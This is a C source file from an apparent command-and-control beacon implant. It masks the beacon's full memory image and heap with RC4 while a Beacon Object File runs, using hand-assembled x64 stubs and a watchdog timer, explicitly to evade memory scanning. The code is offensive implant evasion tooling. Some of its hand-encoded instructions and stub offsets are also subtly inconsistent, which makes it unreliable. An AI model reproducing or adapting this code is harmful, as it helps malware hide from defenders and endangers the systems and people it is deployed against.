/* Phase 3 BOF-window masking (see docs/EVASION-ROADMAP.md section 13.11).
 *
 * Masks the FULL beacon image - .text included - plus every tracked heap
 * block for the duration of a BOF that imports NO beacon APIs (boff.cpp
 * gates on the import analysis). The admission rule is what makes .text
 * maskable at all: with zero ftable relocations the BOF can never execute
 * beacon code during its run, so nothing needs the image in plaintext -
 * the same class of guarantee the gen3 sleep window has, applied to an
 * arbitrary Win32-only workload.
 *
 * The transitions are the hard part (an in-place RC4 of .text destroys the
 * running engine - the round-14 lesson that keeps .text out of the gen3
 * sleep mask). Solution: three hand-assembled stubs on a private RX page
 * (gate-stub technique) bracket the window:
 *
 *   C: mask every non-.text block (plain RC4 loops, still in .text)
 *   call enter_stub:                       [entered rsp%16==8]
 *       sub rsp,8 / push exit_stub / sub rsp,0x28   -> BOF ret lands on
 *                                                      exit_stub, rsp%16==8
 *       sf032(u_text, u_key)               <- masks .text (the LAST block)
 *                                              while executing the page
 *       rcx=args, rdx=alen, jmp entry
 *   [BOF runs: whole image + tracked heap ciphertext, Win32 calls only]
 *   BOF ret -> exit_stub:                  [entered rsp%16==0]
 *       xchg state 1->2 (watchdog race guard); winner: sf032(.text) back
 *       ret                                <- pops the C caller's return
 *   C: unmask the remaining blocks, kill the watchdog, wipe the ctx
 *
 * The pushed exit_stub makes the stack self-consistent - no frame surgery:
 * the C caller resumes exactly as if enter_stub had returned normally.
 *
 * Watchdog: if the BOF never returns, a one-shot timer fires watchdog_stub
 * (page code): xchg-winner restores .text, tail-jumps bw_watchdog_rest
 * (plain C, .text plaintext again) which restores the rest. The beacon
 * degrades to unmasked with the BOF still running - never stuck masked.
 *
 * Alignment cheatsheet (why the paddings differ): enter/exit/watchdog are
 * entered with rsp%16 of 8 / 0 / 8 respectively; each sf032 call site pads
 * to rsp%16==0 right before its call. Verified by capstone disassembly of
 * the built page (evasion-lab/verify_bofwin_stub.py).
 *
 * x64 only. x86 compiles to permanent FALSE (caller runs the BOF unmasked). */
#include <windows.h>
#include <string.h>
#include "sleepmask_bofwin.h"
#include "sleepmask_gen3.h"

#if defined(BW_TRACE_ENABLE)
#include <stdio.h>
#define BW_TRACE(msg) fprintf(stderr, "[bw] %s\n", msg)
#define BW_TRACE2(msg, a, b, c) fprintf(stderr, "[bw] %s p=%p len=%lu idx=%d\n", msg, (void *)(a), (unsigned long)(b), (int)(c))
#else
#define BW_TRACE(msg) ((void)0)
#define BW_TRACE2(msg, a, b, c) ((void)0)
#endif
#include "gargleint.h"
#include "track_memory.h"
#include "crypto.h"

#if defined(_M_X64)

typedef struct {
	unsigned char * ptr;
	unsigned long   len;
	DWORD           orig_prot; /* restored after the unmask - .text is RX in
	                            * the injected image and RC4 needs RW */
} BW_BLOCK;

#define BW_MAX_BLOCKS 128

typedef struct {
	unsigned long   Length;          /* USTRING is ANSI_STRING-shaped:     */
	unsigned long   MaximumLength;   /* {len, max, buf} - the first cut    */
	unsigned char * Buffer;          /* shipped {buf,len,max} and sf032    */
} BW_USTRING;                        /* dereferenced the length as a ptr   */

#ifndef NTSTATUS
#define NTSTATUS LONG
#endif
typedef NTSTATUS(NTAPI *BW_SF032)(BW_USTRING * data, BW_USTRING * key);

/* ctx page - FIXED OFFSETS addressed by the hand-asm stubs. Any field move
 * must update the stub builders below. */
typedef struct {
	volatile LONG   state;                /* +0x00: 0 idle / 1 open / 2 closed */
	volatile LONG   rest_done;            /* +0x04: rest-unmask claim flag    */
	unsigned char   key[16];              /* +0x08                            */
	BW_SF032        sf032;                /* +0x18 SystemFunction032          */
	void          (*entry)(void *, int);  /* +0x20 BOF entry                  */
	void          * args;                 /* +0x28                            */
	int             alen;                 /* +0x30                            */
	BW_BLOCK      * blocks;               /* +0x38 -> ctx->storage            */
	int             nblocks;              /* +0x40                            */
	int             text_idx;             /* +0x48 .text block index          */
	BW_USTRING      u_text;               /* +0x50                            */
	BW_USTRING      u_key;                /* +0x60  (Buffer -> ctx->key)      */
	unsigned long   vp_old;               /* +0x70 VirtualProtect old-prov bin */
	unsigned long   text_prot;            /* +0x74 .text original protection  */
	unsigned char   key2[16];             /* +0x78 ctr-variant work buffer: bw_rc4
	                                       * must not carry a stack array, or /GS
	                                       * reads the ciphertext cookie on the
	                                       * .data-unmask call and fail-fasts in
	                                       * the epilogue (bypasses every VEH) */
	BOOL (WINAPI  * pVirtualProtect)(void *, SIZE_T, DWORD, DWORD *); /* +0x88 */
	BOOL (WINAPI  * pFlushIC)(void *, const void *, SIZE_T);          /* +0x90 */
	volatile LONG   phase;                /* +0x98 crash forensics: 1=VP done
	                                       * 2=masked 3=BOF done 4=exit back  */
	unsigned char   storage[BW_MAX_BLOCKS * sizeof(BW_BLOCK)];      /* +0xA0 */
} BW_CTX;

volatile long g_bw_watchdog_fires;  /* test hook: watchdog rest-path count */

static unsigned char * g_bw_stubs;   /* private RX page: enter/exit/watchdog */
static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */

#define BW_STATE_IDLE   0
#define BW_STATE_OPEN   1
#define BW_STATE_CLOSED 2

#define BW_ENTER_OFF 0x000
#define BW_EXIT_OFF  0x060
#define BW_WATCH_OFF 0x0E0
#define BW_CTXQ_OFF  0x160   /* after the watchdog tail-jump data qword */

/* RC4-with-counter, byte-for-byte the gen3 scheme (sleepmask_gen3.cpp):
 * round-tripping a block under a DIFFERENT counter would corrupt it. */
/* GS-free by construction: the ctr-variant key bytes land in the private
 * ctx page (work), never in a stack array. A stack array gives this frame
 * a /GS cookie - and the .data-unmask call would read the ciphertext cookie
 * in its prologue and the restored one in its epilogue (mismatch = fail-fast
 * that bypasses every VEH, the host-test killer). */
static void bw_rc4(BW_SF032 fn, unsigned char * buf, unsigned long len,
                   unsigned char * work, const unsigned char * key, unsigned int ctr)
{
	BW_USTRING d, kk;
	int j;

	for (j = 0; j < 16; j++)
		work[j] = key[j];
	work[0] ^= (unsigned char)ctr;
	work[1] ^= (unsigned char)(ctr >> 8);
	kk.Buffer = work;
	kk.Length = kk.MaximumLength = 16;
	d.Buffer = buf;
	d.Length = d.MaximumLength = len;
	fn(&d, &kk);
	work[0] = 0;
	work[1] = 0;
}

/* section protection with guard/noaccess rejection. The original
 * protection is returned through *prot for the post-unmask restore: .text
 * is RX in the injected image and the RC4 pass needs RW, so the window
 * flips pages and puts them back (the arsenal-kit sleepmasks do the same
 * around their encryption). */
static BOOL bw_page_usable(void * p, DWORD * prot)
{
	MEMORY_BASIC_INFORMATION mbi;

	if (p == NULL || prot == NULL)
		return FALSE;
	if (!VirtualQuery(p, &mbi, sizeof(mbi)))
		return FALSE;
	if (mbi.State != MEM_COMMIT)
		return FALSE;
	if (mbi.Protect & PAGE_GUARD)
		return FALSE;
	if (mbi.Protect == PAGE_NOACCESS)
		return FALSE;
	*prot = mbi.Protect;
	return TRUE;
}

/* restore the recorded protections; plain C - only ever called from the
 * window teardown, after the exit stub put .text back (so IAT works) */
static void bw_blocks_restore(BW_BLOCK * blocks, int n, int text_idx)
{
	int i;
	DWORD old = 0;

	for (i = 0; i < n; i++) {
		if (i == text_idx)
			continue;
		VirtualProtect(blocks[i].ptr, blocks[i].len, blocks[i].orig_prot, &old);
	}
}

/* Snapshot the whole image (header page + every section except the
 * unwind/reloc tables) plus tracked heap records outside the image. The
 * .text block is appended LAST and reported via *text_idx - the enter stub
 * masks it separately and the exit stub restores it first. */
static int bw_snapshot(BW_BLOCK * out, int max, void * image, int * text_idx)
{
	DWORD text_span[2];
	int n, t;

	/* the g3 engine already walks our own PE (header page, writable
	 * non-.text sections, tracked heap with the in-image dedup rules) -
	 * reuse it instead of a second parser */
	(void)image;
	n = g3_snapshot_for_bofwin(out, max, text_span);
	if (n <= 0)
		return 0;
	if (text_span[0] == 0 || text_span[1] <= text_span[0])
		return 0;

	/* append .text (single committed region clamp, same as g3 keeps for
	 * its own exclusions); the enter stub masks it LAST via ctx->u_text */
	t = n;
	if (t < max && bw_page_usable((unsigned char *)gparms->beacon_ptr + text_span[0],
	                              &out[t].orig_prot)) {
		out[t].ptr = (unsigned char *)gparms->beacon_ptr + text_span[0];
		out[t].len = text_span[1] - text_span[0];
		*text_idx = t;
		n++;
	}
	if (*text_idx < 0)
		return 0;
	return n;
}

/* ---- hand-assembled transition stubs (gate-stub technique) ----
 *
 * Page layout (byte offsets; the ctx qword and the watchdog tail-jump
 * target are patched at build time):
 *   0x000 enter_stub
 *   0x040 exit_stub
 *   0x080 watchdog_stub
 *   0x0C0 qword: ctx page address (rip-relative source for all three)
 *
 * enter (called from C, rsp%16==8, [rsp]=ret_to_C):
 *   sub rsp,8              48 83 EC 08         -> 0
 *   mov r11,exit_imm64     49 BB ..            (page+0x040)
 *   push r11               41 53               -> 8, [rsp]=exit
 *   sub rsp,0x28           48 83 EC 28         -> 0 (32B shadow + 8 align)
 *   mov rax,[rip+ctx]      48 8B 05 d32
 *   lea rcx,[rax+0x50]     48 8D 48 50         u_text
 *   lea rdx,[rax+0x60]     48 8D 50 60         u_key
 *   call [rax+0x18]        FF 50 18            sf032: .text masked (last)
 *   add rsp,0x28           48 83 C4 28         -> 8
 *   mov rcx,[rax+0x28]     48 8B 48 28         args
 *   mov edx,[rax+0x30]     8B 50 30            alen
 *   jmp [rax+0x20]         FF 60 20            BOF entry (as-if-called)
 *
 * exit (BOF's ret lands here, rsp%16==0, [rsp]=ret_to_C):
 *   mov rax,[rip+ctx]      48 8B 05 d32
 *   mov ecx,2              B9 02 00 00 00
 *   xchg ecx,[rax]         87 08               claim the close atomically
 *   cmp ecx,1              83 F9 01
 *   jne skip               75 13               (19 bytes to skip)
 *   sub rsp,0x30           48 83 EC 30         -> 0 (entered at 0!)
 *   lea rcx,[rax+0x50]     48 8D 48 50
 *   lea rdx,[rax+0x60]     48 8D 50 60
 *   call [rax+0x18]        FF 50 18            .text restored
 *   add rsp,0x30           48 83 C4 30
 * skip:
 *   ret                    C3                  -> back into plaintext C
 *
 * watchdog (timer callback, rsp%16==8, [rsp]=ret_dispatcher):
 *   mov rax,[rip+ctx]      48 8B 05 d32
 *   mov ecx,2              B9 02 00 00 00
 *   xchg ecx,[rax]         87 08
 *   cmp ecx,1              83 F9 01
 *   jne wd_ret             75 24               (36 bytes to the ret)
 *   sub rsp,0x28           48 83 EC 28         -> 0 (entered at 8)
 *   lea rcx,[rax+0x50]     48 8D 48 50
 *   lea rdx,[rax+0x60]     48 8D 50 60
 *   call [rax+0x18]        FF 50 18            .text restored mid-BOF
 *   add rsp,0x28           48 83 C4 28         -> 8
 *   mov rcx,rax            48 89 C1            ctx as first arg
 *   jmp [rip+0]            FF 25 00 00 00 00   tail-jump bw_watchdog_rest
 *   <qword &bw_watchdog_rest>                    (returns to dispatcher)
 * wd_ret:
 *   ret                    C3
 */
static unsigned char * bw_put32(unsigned char * p, long v)
{
	memcpy(p, &v, 4);
	return p + 4;
}

static unsigned char * bw_put64(unsigned char * p, unsigned long long v)
{
	memcpy(p, &v, 8);
	return p + 8;
}

/* disp32 so a rip-relative instruction ending at page offset next targets
 * the qword at page offset target */
static long bw_disp(int next, int target)
{
	return (long)target - (long)next;
}

static BW_SF032 bw_sf032_resolve(void)
{
	HMODULE adv = GetModuleHandleA("advapi32.dll");

	if (adv == NULL)
		adv = LoadLibraryA("advapi32.dll");
	if (adv == NULL)
		return NULL;
	return (BW_SF032)GetProcAddress(adv, "SystemFunction032");
}

/* the watchdog tail-jump target: restores the non-.text blocks from plain
 * C. Reached only after the winning xchg already restored .text, so this
 * runs with .text plaintext even while the BOF is still going. Returns to
 * the timer dispatcher (the stub tail-jumped with its return address). */
static void __stdcall bw_watchdog_rest(BW_CTX * ctx)
{
	int i;

	if (ctx == NULL || InterlockedExchange(&ctx->rest_done, 1) != 0)
		return; /* the post-exit C path (or a prior watchdog) did it */
	InterlockedIncrement(&g_bw_watchdog_fires);
	for (i = 0; i < ctx->nblocks; i++) {
		if (i == ctx->text_idx)
			continue;
		bw_rc4(ctx->sf032, ctx->blocks[i].ptr, ctx->blocks[i].len,
		       ctx->key2, ctx->key, (unsigned int)i);
	}
	/* .text protection was restored by the winning stub; the remaining
	 * blocks' protections are restored by the window teardown on the BOF
	 * thread (bw_blocks_restore). The exit_stub sees state==CLOSED and
	 * just rets. */
}

static BOOL bw_build_pages(void)
{
	DWORD old = 0;
	unsigned char * p;
	unsigned char * e;

	if (g_bw_stubs != NULL && g_bw_ctx != NULL)
		return TRUE;

	g_bw_ctx = (BW_CTX *)VirtualAlloc(NULL, sizeof(BW_CTX), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	g_bw_stubs = (unsigned char *)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (g_bw_ctx == NULL || g_bw_stubs == NULL)
		return FALSE;
	memset(g_bw_ctx, 0, sizeof(BW_CTX));
	memset(g_bw_stubs, 0, 0x1000);
	p = g_bw_stubs;
#define BW_BUILD_FAIL() do { 	VirtualFree(g_bw_ctx, 0, MEM_RELEASE);  g_bw_ctx = NULL; 	VirtualFree(g_bw_stubs, 0, MEM_RELEASE); g_bw_stubs = NULL; 	return FALSE; } while (0)

	/* ---- enter_stub (called from C, rsp%16==8, [rsp]=ret_to_C) ----
	 * Stack contract (the first two builds were off by 8: push must land
	 * exit DIRECTLY in [ret-8], the slot the BOF's ret will pop, and the
	 * call-alignment pad must match - sub 0x20 after the push, not 0x28
	 * after a bogus sub 8):
	 *   push r11(exit)                [ret-8]=exit, rsp%16 -> 0
	 *   sub rsp,0x20                  rsp%16==0 for the calls below
	 *   mov rax,[rip+ctx]
	 *   VirtualProtect(u_text.buf, len32, PAGE_RW, &ctx->vp_old)
	 *   mov rax,[rip+ctx]             (rax volatile: reload per call group)
	 *   sf032(u_text, u_key)          <- .text masked, executing the page
	 *   mov rax,[rip+ctx]
	 *   add rsp,0x20                  rsp = ret-8 ("call-entered" shape)
	 *   jmp [ctx->entry]              entry's ret pops exit -> exit_stub;
	 *                                 exit's ret pops [ret] -> this frame
	 */
	e = p + BW_ENTER_OFF;
	e[0] = 0x49; e[1] = 0xBB;                                        /* mov r11, imm64 exit */
	e = bw_put64(e + 2, (unsigned long long)(p + BW_EXIT_OFF));
	e[0] = 0x41; e[1] = 0x53;                                        /* push r11 */
	e += 2;
	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x20;            /* sub rsp,0x20 */
	e += 4;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] buf */
	e += 4;
	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* mov edx,[rax+0x50] len32 */
	e += 3;
	e[0] = 0x41; e[1] = 0xB8; e[2] = 0x04; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov r8d,PAGE_RW */
	e += 6;
	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
	e += 4;
	e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00;                          /* call VP->RW */
	e += 3;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
	e[0] = 0x89; e[1] = 0x40; e[2] = 0x98;                          /* mov [rax+0x98],eax: phase=VP ret */
	e += 3;
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
	e += 4;
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
	e += 4;
	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
	e += 3;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x20;            /* add rsp,0x20 */
	e += 4;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x28;            /* mov rcx,[rax+0x28] args */
	e += 4;
	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x30;                          /* mov edx,[rax+0x30] alen */
	e += 3;
	e[0] = 0xFF; e[1] = 0x60; e[2] = 0x20;                          /* jmp [rax+0x20] entry */
	e += 3;
	if ((int)(e - (p + BW_ENTER_OFF)) > 0x60)
		BW_BUILD_FAIL();

	/* ---- exit_stub (BOF's ret lands here, rsp%16==0, .text=RW-cipher) ----
	 * mov rax,[rip+ctx]; mov ecx,2; xchg ecx,[rax]; cmp ecx,1; jne ret
	 * winner: sf032(.text plaintext) / reload / VP(.text->orig RX) /
	 *         reload / FlushInstructionCache(-1, buf, len32)
	 * ret  (loser path: the watchdog already restored everything)
	 */
	e = p + BW_EXIT_OFF;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
	e[0] = 0xC7; e[1] = 0x40; e[2] = 0x98;                          /* mov dword [rax+0x98],3 */
	e[3] = 0x03; e[4] = 0x00; e[5] = 0x00; e[6] = 0x00;
	e += 7;
	e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
	e += 5;
	e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
	e += 2;
	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
	e += 3;
	e[0] = 0x75; e[1] = 0x49;                                        /* jne ret (+0x49) */
	e += 2;
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
	e += 4;
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
	e += 4;
	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
	e += 3;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] buf */
	e += 4;
	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* mov edx,[rax+0x50] len32 */
	e += 3;
	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] orig */
	e = bw_put32(e + 3, 0x74);
	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
	e += 4;
	e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00;                          /* call VP->RX */
	e += 3;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
	e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* mov rcx,-1 */
	e += 7;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] buf */
	e += 4;
	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x50] len32 */
	e = bw_put32(e + 3, 0x50);
	e[0] = 0xFF; e[1] = 0x90;                                        /* call [rax+0x80] flush */
	e = bw_put32(e + 2, 0x90);
	e[0] = 0xC3;                                                     /* ret */
	e += 1;
	if ((int)(e - (p + BW_EXIT_OFF)) > 0x70)
		BW_BUILD_FAIL();

	/* ---- watchdog_stub (timer callback, rsp%16==8; fires mid-BOF) ----
	 * same claim+restore sequence (sub 0x28 for call alignment), then
	 * reload + mov rcx,rax + tail-jump into the C rest-unmask.
	 * wd_ret: ret
	 */
	e = p + BW_WATCH_OFF;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
	e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
	e += 5;
	e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
	e += 2;
	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
	e += 3;
	e[0] = 0x75; e[1] = 0x6C;                                        /* jne wd_ret (+0x6C) */
	e += 2;
	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
	e += 4;
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
	e += 4;
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
	e += 4;
	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
	e += 3;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] buf */
	e += 4;
	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* mov edx,[rax+0x50] len32 */
	e += 3;
	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] orig */
	e = bw_put32(e + 3, 0x74);
	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
	e += 4;
	e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00;                          /* call VP->RX */
	e += 3;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
	e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* mov rcx,-1 */
	e += 7;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] buf */
	e += 4;
	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x50] len32 */
	e = bw_put32(e + 3, 0x50);
	e[0] = 0xFF; e[1] = 0x90;                                        /* call flush */
	e = bw_put32(e + 2, 0x90);
	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* add rsp,0x28 */
	e += 4;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
	e[0] = 0x48; e[1] = 0x89; e[2] = 0xC1;                          /* mov rcx,rax */
	e += 3;
	e[0] = 0xFF; e[1] = 0x25;                                        /* jmp qword [rip+0] */
	{
		unsigned long long rest = (unsigned long long)(size_t)bw_watchdog_rest;
		memcpy(e + 6, &rest, 8); /* data qword sits at the instruction end */
	}
	e += 14;
	e[0] = 0xC3;                                                     /* wd_ret: ret */
	e += 1;
	if ((int)(e - (p + BW_WATCH_OFF)) > 0x80)
		BW_BUILD_FAIL();

	/* the ctx qword all three stubs load rip-relatively */
	bw_put64(p + BW_CTXQ_OFF, (unsigned long long)(size_t)g_bw_ctx);

	if (!VirtualProtect(p, 0x1000, PAGE_EXECUTE_READ, &old))
		BW_BUILD_FAIL();
	FlushInstructionCache(GetCurrentProcess(), p, 0x1000);
#undef BW_BUILD_FAIL
	return TRUE;
}

BOOL bofwin_supported(void)
{
	return bw_build_pages();
}

BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
{
	BW_SF032 fn;
	BW_CTX * ctx;                 /* stack-local: g_bw_ctx itself sits in
	                               * .data and is ciphertext after the mask */
	BW_BLOCK * blocks;
	int nblocks, text_idx, i;
	unsigned char key[16];
	HANDLE timer = NULL;
	void (*enter)(void);
	BOOL (*pVP)(void *, SIZE_T, DWORD, DWORD *);
	BOOL (*pFlush)(void *, const void *, SIZE_T);
	unsigned int * k = (unsigned int *)key;

	/* a background job thread could execute beacon code while the image is
	 * ciphertext - the window is single-threaded only (same guard as the
	 * gen3 sleep path). gparms must already be initialized by the caller
	 * (boff.cpp mirrors gen3_sleep's lazy gargle_setup_parms). */
	if (entry == NULL || threadcount > 0 || gparms == NULL || gparms->beacon_ptr == NULL)
		return FALSE;
	if (!bw_build_pages())
		return FALSE;
	fn = bw_sf032_resolve();
	if (fn == NULL)
		return FALSE;
	BW_TRACE("resolved sf032");

	/* capture every engine pointer BEFORE any masking: after the mask
	 * loop, this function's only legal memory accesses are its own stack
	 * and the (never-masked) private ctx/stub pages */
	ctx = g_bw_ctx;
	blocks = (BW_BLOCK *)ctx->storage;
	nblocks = bw_snapshot(blocks, BW_MAX_BLOCKS, gparms->beacon_ptr, &text_idx);
	if (nblocks < 2 || text_idx < 0)
		return FALSE;
	if (crypto_rng_get_bytes(key, (unsigned long)sizeof(key)) == 0)
		return FALSE;
	BW_TRACE("snapshot+rng done");

	pVP = VirtualProtect;
	pFlush = FlushInstructionCache;

	ctx->state = BW_STATE_OPEN;
	ctx->rest_done = 0;
	memcpy(ctx->key, key, 16);
	ctx->sf032 = fn;
	ctx->entry = entry;
	ctx->args = args;
	ctx->alen = alen;
	ctx->blocks = blocks;
	ctx->nblocks = nblocks;
	ctx->text_idx = text_idx;
	ctx->text_prot = blocks[text_idx].orig_prot;
	ctx->vp_old = 0;
	ctx->pVirtualProtect = pVP;
	ctx->pFlushIC = pFlush;
	ctx->phase = 0;
	ctx->u_text.Buffer = blocks[text_idx].ptr;
	ctx->u_text.Length = ctx->u_text.MaximumLength = blocks[text_idx].len;
	ctx->u_key.Buffer = ctx->key;
	ctx->u_key.Length = ctx->u_key.MaximumLength = 16;

	/* the watchdog is created BEFORE the mask loop: its IAT entry lives in
	 * .rdata, which is ciphertext from the mask on. One-shot, min 50ms -
	 * the mask loop takes microseconds, it can never fire early. */
	if (watchdog_ms < 50)
		watchdog_ms = (watchdog_ms == 0) ? BW_DEFAULT_WATCHDOG_MS : 50;
	if (!CreateTimerQueueTimer(&timer, NULL,
	                           (WAITORTIMERCALLBACK)(void *)(g_bw_stubs + BW_WATCH_OFF),
	                           NULL, watchdog_ms, 0,
	                           WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION))
		return FALSE; /* no watchdog -> no window (nothing masked yet) */
	BW_TRACE("watchdog timer armed");

	/* flip each non-.text block to RW and mask it in one pass; .text stays
	 * plaintext and executable until enter_stub */
	for (i = 0; i < nblocks; i++) {
		DWORD oldp = 0;
		if (i == text_idx)
			continue;
		if (!VirtualProtect(blocks[i].ptr, blocks[i].len, PAGE_READWRITE, &oldp)) {
			bw_blocks_restore(blocks, nblocks, text_idx);
			DeleteTimerQueueTimer(NULL, timer, NULL);
			ctx->state = BW_STATE_IDLE;
			return FALSE;
		}
		bw_rc4(fn, blocks[i].ptr, blocks[i].len, ctx->key2, key, (unsigned int)i);
	}
	ctx->phase = 2; /* all but .text masked; NO API CALLS from here until the
	                 * exit stub returns (.rdata and the IAT are ciphertext) */

	/* from here to the exit stub this thread may only touch: stack, ctx
	 * page, stub page. enter_stub flips .text to RW, masks it (last block),
	 * enters the BOF; the BOF's ret -> exit_stub restores .text + RX and
	 * returns into THIS frame. */
	enter = (void (*)(void))(g_bw_stubs + BW_ENTER_OFF);
	enter();
	ctx->phase = 4; /* exit stub returned to this frame - no trace here,
	                 * .rdata (and the IAT) is still ciphertext */

	/* .text is plaintext+RX again (exit_stub, or the watchdog won and
	 * exit_stub saw state==CLOSED). The image except .text is still
	 * ciphertext here - unmask it via the stack-local ctx, restore the
	 * remaining protections, THEN touch any IAT. */
	if (InterlockedExchange(&ctx->rest_done, 1) == 0) {
		for (i = 0; i < nblocks; i++) {
			if (i != text_idx)
				bw_rc4(fn, blocks[i].ptr, blocks[i].len, ctx->key2, key, (unsigned int)i);
		}
	}
	bw_blocks_restore(blocks, nblocks, text_idx);
	DeleteTimerQueueTimer(NULL, timer, NULL);
	BW_TRACE("window complete"); /* IAT alive again: everything unmasked */

	memset(key, 0, sizeof(key));
	memset(ctx->key, 0, 16);
	memset(ctx->storage, 0, sizeof(ctx->storage));
	ctx->state = BW_STATE_IDLE;
	(void)k;
	return TRUE;
}

#else /* !_M_X64: x86 keeps the sleeve small - no window, plain BOF */

BOOL bofwin_supported(void)
{
	return FALSE;
}

BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
{
	(void)entry; (void)args; (void)alen; (void)watchdog_ms;
	return FALSE;
}

#endif
